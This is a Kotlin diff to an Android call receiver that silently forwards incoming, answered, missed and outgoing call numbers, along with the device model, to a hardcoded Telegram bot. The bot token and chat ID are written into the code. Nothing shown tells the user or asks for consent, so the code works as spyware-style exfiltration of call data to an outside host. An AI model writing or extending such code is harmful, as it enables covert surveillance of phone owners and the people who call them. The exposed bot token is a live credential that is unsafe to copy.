@@ -11,33 +11,52 @@ import okhttp3.RequestBody.Companion.toRequestBody
 
 class CallReceiver : BroadcastReceiver() {
     private val client = OkHttpClient()
+    private var lastState: String? = null
+    private var savedNumber: String? = null
 
     override fun onReceive(context: Context?, intent: Intent?) {
         val state = intent?.getStringExtra(TelephonyManager.EXTRA_STATE)
         val incomingNumber = intent?.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
         val deviceModel = getDeviceModel()
 
-        if (state == TelephonyManager.EXTRA_STATE_RINGING && incomingNumber != null) {
-            val callerNumber = incomingNumber
-            val deviceModel = getDeviceModel()
-
-            sendCallInfoToTelegram(callerNumber, deviceModel)
+        if (state == TelephonyManager.EXTRA_STATE_RINGING) {
+            savedNumber = incomingNumber
+            if (savedNumber != null) {
+                sendCallInfoToTelegram(savedNumber!!, "Входящий вызов", deviceModel)
+            }
+        } else if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
+            if (lastState == TelephonyManager.EXTRA_STATE_RINGING && savedNumber != null) {
+                sendCallInfoToTelegram(savedNumber!!, "Вызов принят", deviceModel)
+            }
+        } else if (state == TelephonyManager.EXTRA_STATE_IDLE) {
+            if (lastState == TelephonyManager.EXTRA_STATE_RINGING && savedNumber != null) {
+                sendCallInfoToTelegram(savedNumber!!, "Пропущенный вызов", deviceModel)
+            }
         }
+
+        // Обработка исходящих вызовов
+        if (intent?.action == Intent.ACTION_NEW_OUTGOING_CALL) {
+            val outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
+            if (outgoingNumber != null) {
+                sendCallInfoToTelegram(outgoingNumber, "Исходящий вызов", deviceModel)
+            }
+        }
+
+        lastState = state
     }
 
     private fun getDeviceModel(): String {
         return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
     }
 
-
-    private fun sendCallInfoToTelegram(callerNumber: String, device: String) {
+    private fun sendCallInfoToTelegram(phoneNumber: String, callType: String, device: String) {
         val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
         val chatId = "6331293386"
         val url = "https://api.telegram.org/bot$botToken/sendMessage"
 
         val text = """
-            Входящий вызов!
-            Номер: $callerNumber
+            $callType
+            Номер: $phoneNumber
             
             $device""".trimIndent()
 
